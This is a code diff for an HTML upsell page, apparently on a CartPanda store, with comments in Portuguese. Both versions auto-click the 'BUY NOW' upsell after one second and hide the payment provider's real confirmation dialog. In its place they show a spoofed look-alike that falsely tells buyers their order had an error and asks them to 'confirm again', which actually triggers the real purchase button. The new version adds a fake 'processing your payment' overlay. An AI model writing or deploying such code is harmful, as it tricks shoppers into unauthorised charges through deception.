@@ -13,163 +13,197 @@
                 new OcuExternal();
                 </script>
             
-	<script>
-	document.addEventListener('DOMContentLoaded', () => {
-	  // 1) Injeta TODO o CSS do modal da CartPanda (container, conteúdo, header, corpo, footer, botões) :contentReference[oaicite:0]{index=0}
-	  const css = `
-		@import url(https://fonts.bunny.net/css?family=inter:400,600);
-		/* Container full-screen com mask */
-		#cartpanda-modal-container,
-		div#cartpandaModal {
-		  position: fixed; top:0; left:0;
-		  width:100%; height:100%;
-		  overflow:auto;
-		  background-color: rgba(0,0,0,0.4);
-		  z-index: 99999;
-		  padding-top: 100px;
-		}
-		/* Box branco centralizado */
-		div#cartpandaModal .cartpanda-modal-content {
-		  width: 35%; margin: 0 auto;
-		  background-color: #fefefe;
-		  border: 1px solid #888;
-		  border-radius: 10px;
-		}
-		@media screen and (max-width:768px) {
-		  div#cartpandaModal .cartpanda-modal-content { width:95%; }
-		}
-		/* Form, header e close */
-		form#cartpanda-payment-form { margin-bottom:0; position: relative; }
-		div.cartpanda-modal-header {
-		  display:flex; justify-content:space-between; align-items:center;
-		  color:#565956; border-radius:10px 10px 0 0;
-		}
-		button.cartpanda-modal-close {
-		  position:absolute; right:0;
-		  background:#fff; border:none; border-radius:10px;
-		  color:#aaa; font-weight:700; padding:10px 15px;
-		}
-		button.cartpanda-modal-close:hover,
-		button.cartpanda-modal-close:active {
-		  color:#000; cursor:pointer; text-decoration:none;
-		}
-		/* Body */
-		div.cartpanda-modal-body { margin:0; padding:2rem; }
-		p.cartpanda-modal-title {
-		  color:#141a27; text-align:center; margin:0 0 .875rem;
-		}
-		p.cartpanda-modal-description {
-		  color:#5b636e; text-align:center; line-height:1.3rem;
-		  margin:10px 0 20px;
-		}
-		/* Footer e botões */
-		footer.cartpanda-modal-footer {
-		  display:flex; flex-wrap:wrap; gap:6px;
-		  justify-content:center; padding-bottom:2rem;
-		  border-bottom-left-radius:10px;
-		  border-bottom-right-radius:10px;
-		}
-		button.cartpanda-secondary-button {
-		  background:#fff; border:1px solid #eeeff1; border-radius:.3rem;
-		  padding:.625rem 1.25rem; font-size:.875rem; line-height:1.25rem;
-		  color:#404958; cursor:pointer;
-		}
-		button.cartpanda-secondary-button:hover {
-		  background:#f5f7ff; border-color:#3b82f6;
-		}
-		button.cartpanda-primary-button {
-		  background:#2f51f6; border:1px solid #2f51f6; border-radius:.3rem;
-		  padding:.625rem 1.25rem; font-size:.875rem; line-height:1.25rem;
-		  color:#fff; cursor:pointer; margin-left:10px;
-		}
-		button.cartpanda-primary-button:hover {
-		  background:#3b82f6; border-color:#3b82f6;
-		}
-		button.cartpanda-primary-button:focus {
-		  outline:none; box-shadow:0 0 0 3px rgba(66,153,225,.5);
-		}
-	  `;
-	  const style = document.createElement('style');
-	  style.innerHTML = css;
-	  document.head.appendChild(style);
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  // 1) Injeta CSS do container e da .cartpanda-modal-content conforme o padrão CartPanda
+  const style = document.createElement('style');
+  style.innerHTML = `
+    @import url(https://fonts.bunny.net/css?family=inter:400,600);
+    /* container full-screen */
+    #cartpanda-modal-container,
+    div#cartpandaModal {
+      position: fixed; top:0; left:0;
+      width:100%; height:100%;
+      overflow:auto;
+      background-color: rgba(0,0,0,0.4);
+      z-index: 99999;
+      padding-top: 100px;
+    }
+    /* content box */
+    div#cartpandaModal .cartpanda-modal-content {
+      background-color: #fefefe;
+      border: 1px solid #888;
+      border-radius: 10px;
+      width: 35%;
+      margin: 0 auto;
+    }
+    @media screen and (max-width:768px){
+      div#cartpandaModal .cartpanda-modal-content { width:95%; }
+    }
+    /* form, header, close */
+    form#cartpanda-payment-form { position: relative; margin:0; }
+    .cartpanda-modal-header {
+      display:flex; justify-content:space-between; align-items:center;
+      border-radius:10px 10px 0 0; color:#565956;
+    }
+    button.cartpanda-modal-close {
+      position:absolute; right:0; padding:10px 15px;
+      background:#fff; border:none; border-radius:10px;
+      color:#aaa; font-weight:700;
+    }
+    button.cartpanda-modal-close:hover,
+    button.cartpanda-modal-close:active {
+      color:#000; cursor:pointer; text-decoration:none;
+    }
+    /* body */
+    .cartpanda-modal-body { padding:2rem; margin:0; }
+    p.cartpanda-modal-title {
+      text-align:center; margin:0 0 .875rem; color:#141a27;
+    }
+    p.cartpanda-modal-description {
+      text-align:center; margin:10px 0 20px;
+      color:#5b636e; line-height:1.3rem;
+    }
+    /* footer & buttons */
+    footer.cartpanda-modal-footer {
+      display:flex; flex-wrap:wrap; justify-content:center;
+      gap:6px; padding-bottom:2rem;
+      border-bottom-left-radius:10px;
+      border-bottom-right-radius:10px;
+    }
+    button.cartpanda-secondary-button {
+      padding:.625rem 1.25rem; font-size:.875rem; line-height:1.25rem;
+      background:#fff; border:1px solid #eeeff1; border-radius:.3rem;
+      color:#404958; cursor:pointer;
+    }
+    button.cartpanda-secondary-button:hover {
+      background:#f5f7ff; border-color:#3b82f6;
+    }
+    button.cartpanda-primary-button {
+      padding:.625rem 1.25rem; font-size:.875rem; line-height:1.25rem;
+      background:#2f51f6; border:1px solid #2f51f6; border-radius:.3rem;
+      color:#fff; cursor:pointer; margin-left:10px;
+    }
+    button.cartpanda-primary-button:hover {
+      background:#3b82f6; border-color:#3b82f6;
+    }
+    button.cartpanda-primary-button:focus {
+      outline:none; box-shadow:0 0 0 3px rgba(66,153,225,.5);
+    }
+  `;
+  document.head.appendChild(style);
 
-	  // 2) Dispara clique automático no BUY NOW após 1s
-	  setTimeout(() => {
-		const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
-		if (buy) buy.click();
-		else console.warn('Auto-upsell: botão BUY NOW não encontrado.');
-	  }, 1000);
+  // 2) Overlay full-screen com spinner + instruções
+  const overlay = document.createElement('div');
+  overlay.id = 'customOverlay';
+  Object.assign(overlay.style, {
+    position:'fixed', top:'0', left:'0',
+    width:'100%', height:'100%',
+    background:'rgba(255,255,255,0.95)',
+    zIndex:'100000', display:'flex',
+    flexDirection:'column', justifyContent:'center',
+    alignItems:'center', textAlign:'center',
+    fontFamily:`'Inter', system-ui, sans-serif`
+  });
+  overlay.innerHTML = `
+    <div class="spinner" style="
+      border:8px solid #f3f3f3;
+      border-top:8px solid #3498db;
+      border-radius:50%;
+      width:60px; height:60px;
+      animation:spin 1s linear infinite;
+      margin-bottom:20px;
+    "></div>
+    <div class="msg" style="
+      font-size:1.125rem;font-weight:600;color:#141a27;margin:5px 0;
+    ">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
+    <div class="msg" style="
+      font-size:1.125rem;font-weight:600;color:#141a27;margin:5px 0;
+    ">PROCESSANDO SEU PAGAMENTO</div>
+    <div class="error" style="
+      display:none;
+      font-size:1rem;font-weight:600;color:#565956;margin-top:20px;
+      pointer-events:none;
+    ">
+      HOUVE UM ERRO EM SEU PEDIDO<br>
+      CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
+    </div>
+  `;
+  document.body.appendChild(overlay);
 
-	  // 3) Observa injeção do modal da CartPanda
-	  const mo = new MutationObserver((records, obs) => {
-		for (const rec of records) {
-		  for (const node of rec.addedNodes) {
-			if (!(node instanceof HTMLElement)) continue;
-			const isModal = node.id==='cartpanda-modal-container'
-						 || node.id==='cartpandaModal'
-						 || node.classList.contains('cartpanda-modal');
-			if (!isModal) continue;
+  // 3) Dispara BUY NOW após 1s
+  setTimeout(() => {
+    const buy = document.querySelector('a.cta-button[href*="accepted=yes"]');
+    if (buy) buy.click();
+  },1000);
 
-			// 4) Esconde o modal original
-			node.style.display = 'none';
+  // 4) Observa injeção do modal original
+  const mo = new MutationObserver((muts, obs) => {
+    for (const { addedNodes } of muts) {
+      for (const node of addedNodes) {
+        if (!(node instanceof HTMLElement)) continue;
+        if (
+          node.id==='cartpanda-modal-container' ||
+          node.id==='cartpandaModal' ||
+          node.classList.contains('cartpanda-modal')
+        ) {
+          // 5) transição do overlay
+          overlay.querySelector('.spinner').style.display='none';
+          overlay.querySelectorAll('.msg').forEach(e=>e.style.display='none');
+          overlay.querySelector('.error').style.display='block';
+          overlay.style.pointerEvents='none';
 
-			// 5) Cria novo modal customizado replicando a estrutura e classes da CartPanda
-			const custom = document.createElement('div');
-			custom.id = 'cartpandaModal';
-			// container existente já tem CSS — basta reaproveitar
-			custom.innerHTML = `
-			  <div class="cartpanda-modal-content">
-				<form id="cartpanda-payment-form">
-				  <div class="cartpanda-modal-header">
-					<!-- Você pode inserir um título aqui, se quiser -->
-					<button type="button" class="cartpanda-modal-close" id="customClose">&times;</button>
-				  </div>
-				  <div class="cartpanda-modal-body">
-					<p class="cartpanda-modal-title">
-					  HOUVE UM ERRO EM SEU PEDIDO
-					</p>
-					<p class="cartpanda-modal-description">
-					  CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-					</p>
-				  </div>
-				  <footer class="cartpanda-modal-footer">
-					<button type="button" class="cartpanda-secondary-button" id="customDecline">
-					  NÃO, OBRIGADO
-					</button>
-					<button type="button" class="cartpanda-primary-button" id="customConfirm">
-					  SIM, CONFIRMAR
-					</button>
-				  </footer>
-				</form>
-			  </div>
-			`;
-			document.body.appendChild(custom);
+          // 6) Esconde o conteúdo original, mas mantém o botão real em DOM
+          const origContent = node.querySelector('.cartpanda-modal-content');
+          if (origContent) origContent.style.visibility='hidden';
+          const realConfirm = node.querySelector('button.cartpanda-primary-button');
+          const realDecline = node.querySelector('button.cartpanda-secondary-button');
+          const realClose   = node.querySelector('button.cartpanda-modal-close');
 
-			// 6) Lógica dos botões customizados
-			document.getElementById('customClose').addEventListener('click', () => {
-			  custom.remove();
-			});
-			document.getElementById('customDecline').addEventListener('click', () => {
-			  // fecha o modal custom e, por segurança, re-exibe o modal original
-			  custom.remove();
-			  node.style.display = '';
-			});
-			document.getElementById('customConfirm').addEventListener('click', () => {
-			  // dispara o clique no botão real da CartPanda (que fica escondido)
-			  const realConfirm = document.querySelector('#cartpanda-payment-confirmation, button.cartpanda-primary-button');
-			  if (realConfirm) realConfirm.click();
-			  custom.remove();
-			});
+          // 7) Cria nova .cartpanda-modal-content alinhada com o container
+          const custom = document.createElement('div');
+          custom.className = 'cartpanda-modal-content';
+          custom.innerHTML = `
+            <form id="custom-form">
+              <div class="cartpanda-modal-header">
+                <button type="button" class="cartpanda-modal-close" id="customClose">&times;</button>
+              </div>
+              <div class="cartpanda-modal-body">
+                <p class="cartpanda-modal-title">HOUVE UM ERRO EM SEU PEDIDO</p>
+                <p class="cartpanda-modal-description">CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO</p>
+              </div>
+              <footer class="cartpanda-modal-footer">
+                <button type="button" class="cartpanda-secondary-button" id="customDecline">
+                  NÃO, OBRIGADO
+                </button>
+                <button type="button" class="cartpanda-primary-button" id="customConfirm">
+                  SIM, CONFIRMAR
+                </button>
+              </footer>
+            </form>
+          `;
+          node.appendChild(custom);
 
-			obs.disconnect();
-			return;
-		  }
-		}
-	  });
+          // 8) Liga eventos dos botões customizados
+          document.getElementById('customClose').onclick = () => {
+            if (realClose) realClose.click();
+          };
+          document.getElementById('customDecline').onclick = () => {
+            if (realDecline) realDecline.click();
+          };
+          document.getElementById('customConfirm').onclick = () => {
+            if (realConfirm) realConfirm.click();
+          };
 
-	  mo.observe(document.body, { childList: true, subtree: true });
-	});
-	</script>
+          obs.disconnect();
+          return;
+        }
+      }
+    }
+  });
+  mo.observe(document.body, { childList:true, subtree:true });
+});
+</script>
 
   <style>
     body {
